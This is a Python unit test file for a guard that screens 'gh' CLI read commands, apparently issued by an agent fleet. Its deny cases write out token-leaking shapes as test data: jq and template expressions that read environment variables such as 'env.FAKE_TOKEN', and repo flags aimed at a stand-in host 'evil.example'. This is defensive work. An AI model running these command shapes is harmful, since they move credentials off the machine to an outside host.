"""Unit tests for the gh read-guard decision module (plugin-hooks/gh-guard-decide.py).

A pre-approved `gh` READ verb can move an environment-resident token off the box, or
reach a host other than github.com, through its own flags. The guard denies exactly
three shapes and leaves every other gh call — including the fleet's own
`--json`/`--jq '.field'` reads — alone. These cases pin both directions.
"""

from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest

_SRC = Path(__file__).resolve().parent.parent / "plugin-hooks" / "gh-guard-decide.py"
_spec = importlib.util.spec_from_file_location("gh_guard_decide", _SRC)
mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(mod)


def verdict(command: str, gh_host: str = "") -> str:
    v, _reason = mod.decide(command, gh_host=gh_host)
    return v


# ── DENY: a jq/template expression that reads the environment ──────────────
@pytest.mark.parametrize(
    "cmd",
    [
        "gh pr list -R o/r --json number --jq 'env.FAKE_TOKEN'",
        'gh pr list --json number --jq "env.FAKE_TOKEN"',
        "gh pr list --json number --jq env.FAKE_TOKEN",
        "gh pr list --json number --jq '$ENV.FAKE_TOKEN'",
        "gh pr list --json number --jq 'env|keys'",
        "gh pr list --json number -q 'env.X'",
        "gh pr list --json number -qenv.X",
        "gh pr list --json number --jq=env.X",
        "gh issue list --json number --template '{{env \"X\"}}'",
        "gh pr list --json number -t 'env.X'",
    ],
)
def test_env_reading_expression_is_denied(cmd):
    assert verdict(cmd) == "deny", cmd


# ── DENY: -R / --repo naming a host that is not github.com ─────────────────
@pytest.mark.parametrize(
    "cmd",
    [
        "gh pr list -R evil.example/o/r --search x",
        "gh pr list --repo evil.example/o/r",
        "gh pr list --repo=evil.example/o/r",
        "gh pr list -Revil.example/o/r",
        "gh pr view https://evil.example/o/r/pull/1",  # URL positional names a host
        "gh issue list -R 127.0.0.1:8080/o/r",
    ],
)
def test_foreign_host_repo_is_denied(cmd):
    assert verdict(cmd) == "deny", cmd


# ── DENY: --web / -w ───────────────────────────────────────────────────────
@pytest.mark.parametrize("cmd", ["gh pr list -R o/r --web", "gh pr view 1 -w"])
def test_web_is_denied(cmd):
    assert verdict(cmd) == "deny", cmd


# ── ALLOW: the fleet's real reads and every ordinary gh call ───────────────
@pytest.mark.parametrize(
    "cmd",
    [
        "gh pr view 12 --json number,title",
        "gh issue list --repo Claudfather/clauDNA --json number,title",
        "gh pr list -R Claudfather/clauDNA --author @me --json number,title,updatedAt",
        "gh release view --repo Claudfather/clauDNA --json tagName -q '.tagName'",
        "gh api user --jq '.login'",
        "gh api repos/o/r/git/trees/main?recursive=1 --jq '.tree[].path'",
        "gh label list --repo o/r --json name --jq '.[].name'",
        "gh pr list --repo o/r --search x --json number,title,url",
        "gh pr list --repo github.com/o/r --json number",  # explicit github.com host is fine
        "gh issue edit 5 --repo o/r --body-file body.md",
        "gh pr list --json headRefName --jq '.env'",  # a field literally named env is not the builtin
        "gh pr view 1 --json body --jq '.body'",
    ],
)
def test_ordinary_reads_are_allowed(cmd):
    assert verdict(cmd) == "allow", cmd


def test_a_command_with_no_gh_is_allowed():
    assert verdict("git log --oneline | cat") == "allow"


def test_the_enterprise_host_is_allowed_when_configured():
    assert verdict("gh pr list -R ghe.internal/o/r --json number", gh_host="ghe.internal") == "allow"


def test_a_second_gh_after_an_operator_is_inspected():
    # The guard must see every gh invocation in a compound command, not only the first.
    assert verdict("gh pr view 1 --json number && gh pr list --jq env.X") == "deny"
